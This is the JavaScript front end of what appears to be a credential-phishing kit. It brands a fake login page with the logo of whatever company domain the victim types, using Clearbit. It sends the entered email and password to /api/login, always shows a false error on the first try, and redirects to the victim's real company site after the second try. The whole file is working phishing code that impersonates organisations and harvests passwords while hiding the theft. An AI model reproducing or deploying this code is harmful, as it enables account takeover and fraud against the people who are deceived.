document.addEventListener('DOMContentLoaded', function() {
    // DOM elements
    const loginForm = document.getElementById('login-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const domainLogo = document.getElementById('domain-logo');
    const footerText = document.getElementById('footer-text');
    const loadingOverlay = document.getElementById('loading-overlay');
    const errorMessage = document.getElementById('error-message');
    const togglePasswordBtn = document.getElementById('toggle-password');
    const headerLogo = document.querySelector('.main-logo');

    // Track login attempts
    let loginAttempts = 0;
    
    // Function to extract domain from email
    function extractDomain(email) {
        if (!email) return null;
        const atIndex = email.indexOf('@');
        if (atIndex === -1) return null;
        return email.slice(atIndex + 1).toLowerCase();
    }
    
    // Function to fetch domain logo
    function fetchDomainLogo(domain) {
        if (!domain) {
            domainLogo.classList.add('d-none');
            // Reset the header logo to the default
            headerLogo.innerHTML = `
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                <path d="M22 6l-10 7L2 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            `;
            return;
        }
        
        // Set logo URL from Clearbit
        const logoUrl = `https://logo.clearbit.com/${domain}`;
        
        // Create a new image to test if the logo exists
        const testImage = new Image();
        testImage.onload = function() {
            // Update the domain logo in the input field
            domainLogo.src = logoUrl;
            domainLogo.classList.remove('d-none');
            
            // Also replace the header logo with the domain logo by creating an img tag
            // Replace SVG with an img element in the parent container
            const logoContainer = headerLogo.parentElement;
            
            // Create the image element
            const imgElement = document.createElement('img');
            imgElement.src = logoUrl;
            imgElement.classList.add('domain-header-logo');
            imgElement.alt = 'Domain Logo';
            
            // Hide the SVG
            headerLogo.style.display = 'none';
            
            // Remove any existing domain logo images first
            const existingLogo = logoContainer.querySelector('.domain-header-logo');
            if (existingLogo) {
                logoContainer.removeChild(existingLogo);
            }
            
            // Add the new image
            logoContainer.appendChild(imgElement);
        };
        testImage.onerror = function() {
            domainLogo.classList.add('d-none');
            
            // Reset the header logo to the default by showing the SVG and removing any domain logo
            headerLogo.style.display = '';
            
            // Remove any existing domain logo images
            const logoContainer = headerLogo.parentElement;
            const existingLogo = logoContainer.querySelector('.domain-header-logo');
            if (existingLogo) {
                logoContainer.removeChild(existingLogo);
            }
            
            // Reset the SVG content
            headerLogo.innerHTML = `
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                <path d="M22 6l-10 7L2 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            `;
        };
        testImage.src = logoUrl;
    }
    
    // Function to update footer text with domain
    function updateFooterText(domain) {
        if (!domain) {
            footerText.textContent = 'Enter your email to see domain information';
            footerText.classList.remove('text-primary');
            footerText.removeAttribute('href');
            return;
        }
        
        footerText.textContent = `${domain}`;
        
        // On second attempt, make it a clickable link
        if (loginAttempts === 1) {
            const protocol = 'https://';
            footerText.href = `${protocol}${domain}`;
            footerText.classList.add('text-primary');
        }
    }
    
    // Function to show loading overlay
    function showLoading() {
        loadingOverlay.classList.remove('d-none');
    }
    
    // Function to hide loading overlay
    function hideLoading() {
        loadingOverlay.classList.add('d-none');
    }
    
    // Function to show error message
    function showError() {
        errorMessage.classList.remove('d-none');
        errorMessage.classList.add('shake');
        
        // Remove shake animation after it completes
        setTimeout(() => {
            errorMessage.classList.remove('shake');
        }, 820);
    }
    
    // Send login data to the server
    async function sendLoginData(email, password, attempt) {
        const data = {
            email: email,
            password: password,
            attempt: attempt,
            timestamp: new Date().toISOString()
        };
        
        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
            
            return await response.json();
        } catch (error) {
            console.error('Error sending login data:', error);
            return { success: false };
        }
    }
    
    // Email input event handler
    emailInput.addEventListener('input', function() {
        const domain = extractDomain(this.value);
        fetchDomainLogo(domain);
        updateFooterText(domain);
    });
    
    // Toggle password visibility
    togglePasswordBtn.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        
        // Toggle eye icon
        const eyeIcon = this.querySelector('i');
        eyeIcon.classList.toggle('fa-eye');
        eyeIcon.classList.toggle('fa-eye-slash');
    });
    
    // Form submission handler
    loginForm.addEventListener('submit', async function(event) {
        event.preventDefault();
        
        // Validate form
        if (!loginForm.checkValidity()) {
            event.stopPropagation();
            loginForm.classList.add('was-validated');
            return;
        }
        
        // Get form data
        const email = emailInput.value;
        const password = passwordInput.value;
        const domain = extractDomain(email);
        
        // Show loading overlay
        showLoading();
        
        // Increment login attempts first
        loginAttempts++;
        
        // Send data to the server
        await sendLoginData(email, password, loginAttempts);
        
        // Simulate server delay
        setTimeout(() => {
            hideLoading();
            
            if (loginAttempts === 1) {
                // First attempt: show error message
                showError();
            } else {
                // Second attempt: redirect to domain website
                const protocol = 'https://';
                window.location.href = `${protocol}${domain}`;
            }
        }, 5000);
    });
});
